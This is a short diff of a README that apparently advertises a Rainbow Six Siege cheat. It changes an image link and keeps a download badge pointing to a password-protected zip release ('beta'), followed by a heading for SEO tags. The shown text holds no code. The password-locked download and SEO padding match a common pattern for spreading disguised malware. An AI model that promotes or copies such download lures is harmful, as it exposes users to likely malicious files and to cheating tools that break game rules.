@@ -37,7 +37,7 @@ Press INSERT or F1 to open the menu
 Toggle features ON/OFF  
 
 ## 💢EXAMPLE  
-![Screenshot of a comment on a GitHub issue showing an image, added in the Markdown, of an Octocat smiling and raising a tentacle.](https://www.skycheats.com/uploads/monthly_2025_05/R6Cheats.webp.c701fa271d19ffe7f4876a98962bf7a9.webp)
+![Screenshot of a comment on a GitHub issue showing an image, added in the Markdown, of an Octocat smiling and raising a tentacle.](https://www.skycheats.com/uploads/monthly_2025_05/RainbowSixHacks.webp.62c9d04692e8037cad588b3c4825e0b9.webp)
 [![Download](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=github)](https://github.com/P4acific3/qelqlhyo/releases/download/r6-v1.0/R6.ELITE.zip)  
 💢PASSWORD - beta💢  
 ### SEO Tags:  
